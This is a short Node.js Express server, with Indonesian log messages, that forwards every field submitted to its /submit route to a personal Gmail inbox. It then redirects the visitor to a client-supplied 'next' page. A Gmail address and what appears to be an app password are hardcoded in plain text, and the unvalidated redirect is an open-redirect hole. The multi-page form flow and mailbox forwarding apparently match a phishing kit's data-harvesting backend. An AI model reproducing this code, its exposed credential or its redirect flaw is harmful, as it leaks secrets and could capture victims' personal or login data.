
const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const path = require("path");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

app.post("/submit", (req, res) => {
  const formData = req.body;
  const nextPage = formData.next || "/halaman4.html";

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "abdul4y7@gmail.com",
      pass: "bwvr kcph tqkf iahl",
    },
  });

  const message = Object.entries(formData)
    .filter(([key]) => key !== "next")
    .map(([key, val]) => `${key}: ${val}`)
    .join("\n");

  const mailOptions = {
    from: "abdul4y7@gmail.com",
    to: "abdul4y7@gmail.com",
    subject: "Form Data Masuk",
    text: message,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Gagal mengirim email:", error);
    } else {
      console.log("Email terkirim:", info.response);
    }
    res.redirect(nextPage);
  });
});

app.listen(PORT, () => {
  console.log(`Server berjalan di port ${PORT}`);
});
